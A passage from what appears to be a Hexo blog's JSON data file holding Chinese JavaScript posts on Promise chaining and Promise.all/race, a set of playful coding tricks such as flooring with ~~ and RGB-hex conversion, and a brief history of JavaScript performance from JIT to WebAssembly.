url2 = <span class=\"string\">\"http://azu.github.io/promises-book/json/people.json\"</span>;</span><br><span class=\"line\">getURL(url1)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">//这里是onfilled填充</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .catch(<span class=\"function\"><span class=\"params\">error</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error); <span class=\"comment\">//这里是onrejected填充</span></span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"Promise-chain-获取上次-promise-的返回值\"><a href=\"#Promise-chain-获取上次-promise-的返回值\" class=\"headerlink\" title=\"Promise chain 获取上次 promise 的返回值\"></a>Promise chain 获取上次 promise 的返回值</h5><blockquote>\n<p>由于 Promise 链式调用的时候，每个 Promise 都是独立的。但是可以通过 return 值来传给下一个 Promise，因为 return 了值是填充了当前 Promise 对象的 resolve</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> val;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val);</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"Promise-静态方法\"><a href=\"#Promise-静态方法\" class=\"headerlink\" title=\"Promise 静态方法\"></a>Promise 静态方法</h5><ul>\n<li>Promise.resolve(42) === new Promise((resolve,reject)=&gt;resolve(42)) ,是它的语法糖</li>\n<li>Promise.reject(new Error(42)) === new Promise((resolve,reject)=&gt;reject(new Error(42))) 是它的语法糖</li>\n<li>如果有多个 Promise 同时需要判断才能进行下一步，可以用 Promise.all([promise1,promise2])。这个 then 方法返回的参数也是一个数组，跟 promise1 和 promise2 的顺序一样。需要注意的是，all 是并行执行的。</li>\n<li>Promise.race([promise1,promise2]) 则和数组的 some 方法很像，只要有一个 promise 对象进入 FulFilled 或者 Rejected 状态的话，就会继续进行后面的处理。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise.all([getURL(url1), getURL(url2)]).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">result</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(result); <span class=\"comment\">//[getURL(url1)的结果，getURL(url2)的结果]</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">promise.race([getURL(url1), getURL(url2)]).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(value); <span class=\"comment\">//一旦这两个promise对象有一个完成了onfilled或onrejected状态，那么就会进行后续的then，所以这里then的参数只有一个value。但不并不会影响其他promise对象的进行，只是它们的结果值不会出现在then的里面</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n"},{"title":"javascript装逼指南","date":"2017-12-03T10:53:56.000Z","_content":"\n> 1.javascript 代码错误处理方式\n\n```javascript\ntry {\n  something;\n} catch (e) {\n  window.location.href = \"http://stackoverflow.com/search?q=[js]+\" + e.message;\n}\n```\n\n> 2.如何优雅的取随机字符串\n\n```javascript\nMath.random()\n  .toString(16)\n  .substring(2);\nMath.random()\n  .toString(36)\n  .substring(2);\n```\n\n> 3.如何优雅的取整\n\n```javascript\nlet a = ~~2.33; //2\n\nlet b = 2.33 | 0; //2\n\nlet c = 2.33 >> 0; //2\n```\n\n> 4.金钱数字取千分位的非正则优雅实现\n\n```javascript\n//用reduce\nfunction formatCash(str) {\n  return str\n    .split(\"\")\n    .reverse()\n    .reduce((prev, next, index) => {\n      return (index % 3 ? next : next + \",\") + prev;\n    });\n}\nconsole.log(formatCash(\"1234567890\")); // 1,234,567,890\n//toLocaleString\n(23333333).toLocaleString(\"en-US\");\n(\"23,333,333\");\n```\n\n> 5.最短代码实现数组去重\n\n```javascript\n[...new Set([1, \"1\", 2, 1, 1, 3])];\n//[1,'1',2,3]\n```\n\n> 6.最短代码实现一个长度为 m(6)且值都为 n（8）的数组\n\n```javascript\nArray(6).fill(8);\n//[8,8,8,8,8,8]\n```\n\n> 7.短路表达式\n\n```javascript\nvar a = b && 1;\n// 相当于\nif (b) {\n  a = 1;\n} else {\n  a = b;\n}\n\nvar a = b || 1;\n// 相当于\nif (b) {\n  a = b;\n} else {\n  a = 1;\n}\n```\n\n> 8.颜色 rgb 和 hex 的相互转换\n\n```javascript\nfunction rgbToHex(r, g, b) {\n  return \"#\" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);\n}\nfunction hexToRgb(hex) {\n  var result = /^#?([a-f\\d]{2})([a-f\\d]{2})([a-f\\d]{2})$/i.exec(hex);\n  return result\n    ? {\n        r: parseInt(result[1], 16),\n        g: parseInt(result[2], 16),\n        b: parseInt(result[3], 16)\n      }\n    : null;\n}\n\nalert(hexToRgb(\"#0033ff\").g); // \"51\";\n```\n","source":"_posts/write-nbjs.md","raw":"---\ntitle: javascript装逼指南\ndate: 2017-12-03 18:53:56\ntags: javascript\n---\n\n> 1.javascript 代码错误处理方式\n\n```javascript\ntry {\n  something;\n} catch (e) {\n  window.location.href = \"http://stackoverflow.com/search?q=[js]+\" + e.message;\n}\n```\n\n> 2.如何优雅的取随机字符串\n\n```javascript\nMath.random()\n  .toString(16)\n  .substring(2);\nMath.random()\n  .toString(36)\n  .substring(2);\n```\n\n> 3.如何优雅的取整\n\n```javascript\nlet a = ~~2.33; //2\n\nlet b = 2.33 | 0; //2\n\nlet c = 2.33 >> 0; //2\n```\n\n> 4.金钱数字取千分位的非正则优雅实现\n\n```javascript\n//用reduce\nfunction formatCash(str) {\n  return str\n    .split(\"\")\n    .reverse()\n    .reduce((prev, next, index) => {\n      return (index % 3 ? next : next + \",\") + prev;\n    });\n}\nconsole.log(formatCash(\"1234567890\")); // 1,234,567,890\n//toLocaleString\n(23333333).toLocaleString(\"en-US\");\n(\"23,333,333\");\n```\n\n> 5.最短代码实现数组去重\n\n```javascript\n[...new Set([1, \"1\", 2, 1, 1, 3])];\n//[1,'1',2,3]\n```\n\n> 6.最短代码实现一个长度为 m(6)且值都为 n（8）的数组\n\n```javascript\nArray(6).fill(8);\n//[8,8,8,8,8,8]\n```\n\n> 7.短路表达式\n\n```javascript\nvar a = b && 1;\n// 相当于\nif (b) {\n  a = 1;\n} else {\n  a = b;\n}\n\nvar a = b || 1;\n// 相当于\nif (b) {\n  a = b;\n} else {\n  a = 1;\n}\n```\n\n> 8.颜色 rgb 和 hex 的相互转换\n\n```javascript\nfunction rgbToHex(r, g, b) {\n  return \"#\" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);\n}\nfunction hexToRgb(hex) {\n  var result = /^#?([a-f\\d]{2})([a-f\\d]{2})([a-f\\d]{2})$/i.exec(hex);\n  return result\n    ? {\n        r: parseInt(result[1], 16),\n        g: parseInt(result[2], 16),\n        b: parseInt(result[3], 16)\n      }\n    : null;\n}\n\nalert(hexToRgb(\"#0033ff\").g); // \"51\";\n```\n","slug":"write-nbjs","published":1,"updated":"2018-04-09T11:58:32.146Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034t100530iof3t4kvk8w","content":"<blockquote>\n<p>1.javascript 代码错误处理方式</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  something;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.location.href = <span class=\"string\">\"http://stackoverflow.com/search?q=[js]+\"</span> + e.message;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>2.如何优雅的取随机字符串</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Math</span>.random()</span><br><span class=\"line\">  .toString(<span class=\"number\">16</span>)</span><br><span class=\"line\">  .substring(<span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"built_in\">Math</span>.random()</span><br><span class=\"line\">  .toString(<span class=\"number\">36</span>)</span><br><span class=\"line\">  .substring(<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>3.如何优雅的取整</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a = ~~<span class=\"number\">2.33</span>; <span class=\"comment\">//2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"number\">2.33</span> | <span class=\"number\">0</span>; <span class=\"comment\">//2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"number\">2.33</span> &gt;&gt; <span class=\"number\">0</span>; <span class=\"comment\">//2</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>4.金钱数字取千分位的非正则优雅实现</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//用reduce</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">formatCash</span>(<span class=\"params\">str</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str</span><br><span class=\"line\">    .split(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">    .reverse()</span><br><span class=\"line\">    .reduce(<span class=\"function\">(<span class=\"params\">prev, next, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (index % <span class=\"number\">3</span> ? next : next + <span class=\"string\">\",\"</span>) + prev;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(formatCash(<span class=\"string\">\"1234567890\"</span>)); <span class=\"comment\">// 1,234,567,890</span></span><br><span class=\"line\"><span class=\"comment\">//toLocaleString</span></span><br><span class=\"line\">(<span class=\"number\">23333333</span>).toLocaleString(<span class=\"string\">\"en-US\"</span>);</span><br><span class=\"line\">(<span class=\"string\">\"23,333,333\"</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5.最短代码实现数组去重</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[...new <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"string\">\"1\"</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>])];</span><br><span class=\"line\"><span class=\"comment\">//[1,'1',2,3]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>6.最短代码实现一个长度为 m(6)且值都为 n（8）的数组</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">6</span>).fill(<span class=\"number\">8</span>);</span><br><span class=\"line\"><span class=\"comment\">//[8,8,8,8,8,8]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>7.短路表达式</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = b &amp;&amp; <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// 相当于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (b) &#123;</span><br><span class=\"line\">  a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  a = b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = b || <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// 相当于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (b) &#123;</span><br><span class=\"line\">  a = b;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>8.颜色 rgb 和 hex 的相互转换</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rgbToHex</span>(<span class=\"params\">r, g, b</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">\"#\"</span> + ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">24</span>) + (r &lt;&lt; <span class=\"number\">16</span>) + (g &lt;&lt; <span class=\"number\">8</span>) + b).toString(<span class=\"number\">16</span>).slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hexToRgb</span>(<span class=\"params\">hex</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"regexp\">/^#?([a-f\\d]&#123;2&#125;)([a-f\\d]&#123;2&#125;)([a-f\\d]&#123;2&#125;)$/i</span>.exec(hex);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result</span><br><span class=\"line\">    ? &#123;</span><br><span class=\"line\">        r: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">1</span>], <span class=\"number\">16</span>),</span><br><span class=\"line\">        g: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">2</span>], <span class=\"number\">16</span>),</span><br><span class=\"line\">        b: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">3</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    : <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">alert(hexToRgb(<span class=\"string\">\"#0033ff\"</span>).g); <span class=\"comment\">// \"51\";</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>1.javascript 代码错误处理方式</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  something;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.location.href = <span class=\"string\">\"http://stackoverflow.com/search?q=[js]+\"</span> + e.message;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>2.如何优雅的取随机字符串</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Math</span>.random()</span><br><span class=\"line\">  .toString(<span class=\"number\">16</span>)</span><br><span class=\"line\">  .substring(<span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"built_in\">Math</span>.random()</span><br><span class=\"line\">  .toString(<span class=\"number\">36</span>)</span><br><span class=\"line\">  .substring(<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>3.如何优雅的取整</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a = ~~<span class=\"number\">2.33</span>; <span class=\"comment\">//2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"number\">2.33</span> | <span class=\"number\">0</span>; <span class=\"comment\">//2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"number\">2.33</span> &gt;&gt; <span class=\"number\">0</span>; <span class=\"comment\">//2</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>4.金钱数字取千分位的非正则优雅实现</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//用reduce</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">formatCash</span>(<span class=\"params\">str</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str</span><br><span class=\"line\">    .split(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">    .reverse()</span><br><span class=\"line\">    .reduce(<span class=\"function\">(<span class=\"params\">prev, next, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (index % <span class=\"number\">3</span> ? next : next + <span class=\"string\">\",\"</span>) + prev;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(formatCash(<span class=\"string\">\"1234567890\"</span>)); <span class=\"comment\">// 1,234,567,890</span></span><br><span class=\"line\"><span class=\"comment\">//toLocaleString</span></span><br><span class=\"line\">(<span class=\"number\">23333333</span>).toLocaleString(<span class=\"string\">\"en-US\"</span>);</span><br><span class=\"line\">(<span class=\"string\">\"23,333,333\"</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5.最短代码实现数组去重</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[...new <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"string\">\"1\"</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>])];</span><br><span class=\"line\"><span class=\"comment\">//[1,'1',2,3]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>6.最短代码实现一个长度为 m(6)且值都为 n（8）的数组</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">6</span>).fill(<span class=\"number\">8</span>);</span><br><span class=\"line\"><span class=\"comment\">//[8,8,8,8,8,8]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>7.短路表达式</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = b &amp;&amp; <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// 相当于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (b) &#123;</span><br><span class=\"line\">  a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  a = b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = b || <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// 相当于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (b) &#123;</span><br><span class=\"line\">  a = b;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>8.颜色 rgb 和 hex 的相互转换</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rgbToHex</span>(<span class=\"params\">r, g, b</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">\"#\"</span> + ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">24</span>) + (r &lt;&lt; <span class=\"number\">16</span>) + (g &lt;&lt; <span class=\"number\">8</span>) + b).toString(<span class=\"number\">16</span>).slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hexToRgb</span>(<span class=\"params\">hex</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"regexp\">/^#?([a-f\\d]&#123;2&#125;)([a-f\\d]&#123;2&#125;)([a-f\\d]&#123;2&#125;)$/i</span>.exec(hex);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result</span><br><span class=\"line\">    ? &#123;</span><br><span class=\"line\">        r: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">1</span>], <span class=\"number\">16</span>),</span><br><span class=\"line\">        g: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">2</span>], <span class=\"number\">16</span>),</span><br><span class=\"line\">        b: <span class=\"built_in\">parseInt</span>(result[<span class=\"number\">3</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    : <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">alert(hexToRgb(<span class=\"string\">\"#0033ff\"</span>).g); <span class=\"comment\">// \"51\";</span></span><br></pre></td></tr></table></figure>\n"},{"title":"js性能填坑之路","date":"2018-04-15T05:48:30.000Z","_content":"\n## 简单介绍\n\n* javascript 是解释性语言，性能很慢，随着 web 在生活中的普及，这点性能显然不够用。你能想象双十一的一个按钮点半天才有反应嘛？所幸很多大神，都在不断的改进这个性能问题\n\n## 漫漫填坑路\n\n### JIT\n\n> google 在 09 年 v8 引擎里引入 just in time compiling（即时编译），跟之前 ajax 出现引起的轰动是一样的，性能瞬间就上升了 20-40 倍的速度。\n\n* 从此网页进入了网页应用的时代\n\n#### 解释器和编译器\n\n* 解释器是一行行解释代码，性能会下降。编译器是把源代码编译成目标代码。\n* 解释器是叫他干什么立刻就去干什么，比如买菜，马上去市场回来，再去买油又马上市场\n* 编译器是叫他干什么直到说完才去干什么，去买菜，买油统一去市场\n\n- 但是 jit 是基于运行期编译，js 是一个没有类型的语言，所以 jit 大多数时候都在猜测 js 的类型。\n\n```javascript\nfunction add(a, b) {\n  return a + b;\n}\nadd(1, 2); //这时候jit就把a和b确认为int类型\n//然后你这样做\nadd(\"hi\", \"yoki\"); //已经编译成机器码了，但是又变成字符串类型，只能推倒重来，有时候jit的性能提升，还没有这个重编的开销大\n```\n\n### TypeScript\n\n* 既然 jit 大多数时候在猜测类型，那索性搞个强类型语言，再编译成 js 就行了\n\n### asm.js\n\n* ts 是 js 的超集，这个是语法兼容 js 的汇编语言，是 js 的子集\n* 通过标注声明类型，而且不得改变，这样就节省了类型判断的时间\n\n### WebAssembly\n\n* 一种二进制码的规范，是比 asm.js 更为激进的东西\n* 理论上所有语言都可以编译成这个，然后泡在浏览器上\n* 但是目前还摸不了 dom\n","source":"_posts/study-performance.md","raw":"---\ntitle: js性能填坑之路\ndate: 2018-04-15 13:48:30\ntags: javascript\n---\n\n## 简单介绍\n\n* javascript 是解释性语言，性能很慢，随着 web 在生活中的普及，这点性能显然不够用。你能想象双十一的一个按钮点半天才有反应嘛？所幸很多大神，都在不断的改进这个性能问题\n\n## 漫漫填坑路\n\n### JIT\n\n> google 在 09 年 v8 引擎里引入 just in time compiling（即时编译），跟之前 ajax 出现引起的轰动是一样的，性能瞬间就上升了 20-40 倍的速度。\n\n* 从此网页进入了网页应用的时代\n\n#### 解释器和编译器\n\n* 解释器是一行行解释代码，性能会下降。编译器是把源代码编译成目标代码。\n* 解释器是叫他干什么立刻就去干什么，比如买菜，马上去市场回来，再去买油又马上市场\n* 编译器是叫他干什么直到说完才去干什么，去买菜，买油统一去市场\n\n- 但是 jit 是基于运行期编译，js 是一个没有类型的语言，所以 jit 大多数时候都在猜测 js 的类型。\n\n```javascript\nfunction add(a, b) {\n  return a + b;\n}\nadd(1, 2); //这时候jit就把a和b确认为int类型\n//然后你这样做\nadd(\"hi\", \"yoki\"); //已经编译成机器码了，但是又变成字符串类型，只能推倒重来，有时候jit的性能提升，还没有这个重编的开销大\n```\n\n### TypeScript\n\n* 既然 jit 大多数时候在猜测类型，那索性搞个强类型语言，再编译成 js 就行了\n\n### asm.js\n\n* ts 是 js 的超集，这个是语法兼容 js 的汇编语言，是 js 的子集\n* 通过标注声明类型，而且不得改变，这样就节省了类型判断的时间\n\n### WebAssembly\n\n* 一种二进制码的规范，是比 asm.js 更为激进的东西\n* 理论上所有语言都可以编译成这个，然后泡在浏览器上\n* 但是目前还摸不了 dom\n","slug":"study-performance","published":1,"updated":"2018-04-19T06:27:50.421Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034t200550iof9ikle603","content":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>javascript 是解释性语言，性能很慢，随着 web 在生活中的普及，这点性能显然不够用。你能想象双十一的一个按钮点半天才有反应嘛？所幸很多大神，都在不断的改进这个性能问题</li>\n</ul>\n<h2 id=\"漫漫填坑路\"><a href=\"#漫漫填坑路\" class=\"headerlink\" title=\"漫漫填坑路\"></a>漫漫填坑路</h2><h3 